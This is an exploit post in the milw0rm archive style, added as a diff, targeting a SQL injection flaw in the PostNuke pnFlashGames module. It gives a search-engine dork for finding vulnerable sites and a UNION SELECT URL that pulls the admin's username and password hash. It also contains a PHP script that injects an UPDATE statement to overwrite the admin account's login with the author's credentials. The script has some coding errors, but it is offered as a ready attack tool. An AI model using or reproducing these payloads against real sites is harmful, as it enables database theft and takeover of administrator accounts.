@@ -1,0 +1,55 @@
+Vuln: Postnuke Mod pnFlashGames (Blind SQL/SQL) all version Vulnerability
+Author: Vulnerability search Kacper (kacper1964_at_yahoo.pl)
+
+dork: inurl:"index.php?module=pnFlashGames"
+
+Author Homepage: http://devilteam.pl/
+
+
+If magic_quotes_gpc = off
+-====
+Vuln to old >2 version:
+
+index.php?module=pnFlashGames&func=display&id=-1+union+select+concat(pn_uname,char(58),pn_pass),1,2,3,4,5,6,7,8+from+nuke_users+where+uid=2/*
+
+-====
+
+Vuln to new version 1.5 == 2.5
+
+[code]
+<? 
+//start options
+$address == ""; // site address (http://google.pl/)
+$prefix == ""; // tables prefix (nuke_users, pn_users)
+//end options
+
+$cryptpass = md5("devilteam");
+echo "Vuln: Postnuke Mod pnFlashGames (Blind SQL/SQL) all version Vulnerability\n";
+echo "Exploit by Kacper\n"; 
+echo "Author Homepage: http://devilteam.pl/\n"; 
+echo "<pre>\n"; 
+echo "Login: Kacper Password:".$cryptpass;
+@set_time_limit(0); 
+@ini_set("display_errors","0"); 
+$hostname = gethostbyname($address); 
+function getid() 
+{global $hostname; 
+$responce = ""; 
+$fsock = fsockopen($hostname,80,$errnum,$errstr,2); 
+$headers = "POST ".address."index.php?module=pnFlashGames&func=display&id=-1+UPDATE+".$prefix."_users+SET+pn_uname='Kacper',+pn_pass='".$cryptpass."'+WHERE+uid=2/* HTTP/1.1\n"; 
+$headers .= "Host: www.google.com\n"; 
+$headers .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.0.2) Gecko/20060308 Firefox/1.5.0.2\n"; 
+$headers .= "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n"; 
+$headers .= "Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7\n"; 
+$headers .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n"; 
+fwrite ($fsock,$headers); 
+while (!feof($fsock)) $responce .= fread($fsock,1024); 
+fclose ($fsock); }
+getid();
+echo "\n";
+?>
+[/code]
+
+Pozdrowienia dla calej ekipy DEVILTEAM.PL
+
+# milw0rm.com [2008-04-26]
